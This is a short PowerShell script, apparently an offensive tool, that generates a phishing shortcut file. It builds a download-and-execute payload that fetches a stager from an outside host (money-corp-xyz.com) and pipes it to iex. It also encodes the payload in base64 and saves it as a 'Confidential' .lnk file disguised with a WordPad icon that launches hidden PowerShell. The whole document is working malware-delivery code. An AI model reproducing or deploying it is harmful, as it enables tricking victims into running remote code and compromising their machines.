$browsers    = @('Firefox','Chrome','InternetExplorer','Opera','Safari')
$browsertype = Get-Random -InputObject $browsers
$UA = [Microsoft.PowerShell.Commands.PSUserAgent]::$browsertype

# Payload (containing both stage 1 and stage 2) :
$ProxyAware = "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials"
$Payload = "$ProxyAware;iwr http://www.money-corp-xyz.com/stager -UseBasicParsing -UserAgent '$UA'|iex"


Write-Output "`n[*] Clear text payload: $Payload"

$Dump = [System.Text.Encoding]::Unicode.GetBytes($Payload)
$EncodedPayload = [Convert]::ToBase64String($Dump)

Write-Output "-----------------------"
Write-Output "`n[*] Encoded payload: $EncodedPayload `n"


$obj = New-object -comobject wscript.shell
$filename=Get-Random -Minimum 1 -Maximum 100
$shortcut = "C:\Temp\Confidential-$filename.lnk"

$link = $obj.createshortcut($shortcut)
$link.windowstyle = "7"
$link.targetpath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
$link.iconlocation = "C:\Program Files (x86)\Windows NT\Accessories\wordpad.exe"
$link.arguments = "-Nop -sta -noni -w hidden -ec $EncodedPayload"
$link.save()

Write-Output "-----------------------"
Write-Output "`n`n[*] Payload generated in $shortcut !`n"
